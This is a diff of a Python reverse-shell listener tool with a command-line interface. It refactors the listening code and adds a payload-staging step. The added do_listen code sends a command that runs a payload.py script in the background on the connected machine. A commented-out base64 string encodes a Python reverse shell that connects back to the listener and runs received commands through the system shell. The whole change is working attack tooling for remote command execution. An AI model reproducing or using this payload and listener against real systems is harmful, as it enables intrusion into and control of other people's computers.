@@ -1,4 +1,5 @@
-#!/usr/bin/python
+#!/usr/bin/python3
+
 from nethelper import ServerSocket, pretty, netshell_loop
 from threading import Thread
 import logging
@@ -9,6 +10,38 @@ import cmd
 
 
 logging.basicConfig(level=logging.INFO)
+
+def listen(line, py_state):
+    if not line:
+        host, port = ("localhost", 4242)
+    else:
+        host, port = line.strip().split(" ")
+
+    sock = ServerSocket()
+
+    try:
+        sock.server_socket.bind((host, int(port)))
+    except socket.error:
+        logging.error("Address already in use")
+        return
+    
+    logging.info(f"Started listener on {host, port}")
+
+    try:
+        sock.listen()
+        if not sock.is_shell(py_state):
+            logging.error("No shell found")
+            return
+    except KeyboardInterrupt:
+        sock.server_socket.close()
+        print("")
+        return
+    except BrokenPipeError:
+        sock.server_socket.close()
+        logging.error("BrokenPipeError")
+        return
+
+    return sock
 
 class NetShell(cmd.Cmd):
     def __init__(self, server):
@@ -124,34 +157,22 @@ class LocalShell(cmd.Cmd):
     """
 
     def do_listen(self, line):
-        if not line:
-            host, port = ("localhost", 4242)
-        else:
-            host, port = line.strip().split(" ")
+        sock = listen(line, 0)
 
-        sock = ServerSocket()
-
-        try:
-            sock.server_socket.bind((host, int(port)))
-        except socket.error:
-            logging.error("Address already in use")
+        if not sock:
             return
         
-        logging.info(f"Started listener on {host, port}")
+        logging.info(f"Sending payload..")
+        # encoded_data = "aW1wb3J0IHRpbWUKaW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKZGVmIGNvbm5lY3RfdG9faG9zdChob3N0LCBwb3J0KToKICAgIGZvciBpIGluIHJhbmdlKDUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgcy5jb25uZWN0KChob3N0LCBwb3J0KSkKICAgICAgICAgICAgcmV0dXJuIHMKICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yOgogICAgICAgICAgICBwcmludChmIkF0dGVtcHQge2krMX06IENvbm5lY3Rpb24gZmFpbGVkLiBSZXRyeWluZy4uLiIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkgICMgd2FpdCBmb3IgNSBzZWNvbmRzIGJlZm9yZSByZXRyeWluZwogICAgcHJpbnQoIkNvdWxkIG5vdCBlc3RhYmxpc2ggY29ubmVjdGlvbi4gRXhpdGluZy4uLiIpCiAgICBleGl0KCkKCmRlZiBleGVjdXRlX2NvbW1hbmQocyk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGRhdGEgPSBzLnJlY3YoMTAyNCkKICAgICAgICBwcmludChkYXRhKQogICAgICAgIGlmIGRhdGEuZGVjb2RlKCJ1dGYtOCIpID09ICdxdWl0JzoKICAgICAgICAgICAgcy5jbG9zZSgpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YS5kZWNvZGUoInV0Zi04IiksIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSkKICAgICAgICBzdGRvdXRfdmFsdWUgPSBwcm9jLnN0ZG91dC5yZWFkKCkgKyBwcm9jLnN0ZGVyci5yZWFkKCkKICAgICAgICBzLnNlbmQoc3Rkb3V0X3ZhbHVlKQoKZGVmIG1haW4oKToKICAgIGhvc3QgPSAnbG9jYWxob3N0JwogICAgcG9ydCA9IDQyNDIKICAgIHMgPSBjb25uZWN0X3RvX2hvc3QoaG9zdCwgcG9ydCkKICAgIGV4ZWN1dGVfY29tbWFuZChzKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQ=="
+        # sock.client_socket.send(f"echo -n {encoded_data} | base64 --decode > payload.py".encode())
+        sock.client_socket.send("setsid sh -c 'sleep 5 && python3 /home/pi/opt/testfolder/payload.py > test.txt'".encode())
+        sock.server_socket.close()
+        sock.client_socket.close()
 
-        try:
-            sock.listen()
-            if sock.is_shell():
-                logging.error("No shell found")
-                return
-        except KeyboardInterrupt:
-            sock.server_socket.close()
-            print("")
-            return
-        except BrokenPipeError:
-            sock.server_socket.close()
-            logging.error("BrokenPipeError")
-            return
+        sock = listen(line, 1)
+        # sock.client_socket.send(b"test\n")
+
+        # print(pyclient)
 
         self.currentSession = NetShell(sock)
 
